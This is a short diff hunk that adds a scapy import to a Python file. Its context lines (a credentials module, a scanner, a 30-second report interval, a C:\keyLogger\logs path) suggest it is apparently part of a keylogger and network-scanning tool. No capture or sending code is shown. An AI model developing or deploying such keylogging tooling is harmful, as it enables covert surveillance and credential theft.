@@ -17,6 +17,7 @@ import credenciais as cr  # For API
 import threading
 import socket
 from IPy import IP  # For Scanner
+from scapy.all import *
 
 SEND_REPORT_EVERY = 30
 PATH = "C:\keyLogger\logs\logs_" + str(time.monotonic_ns()) + ".txt"
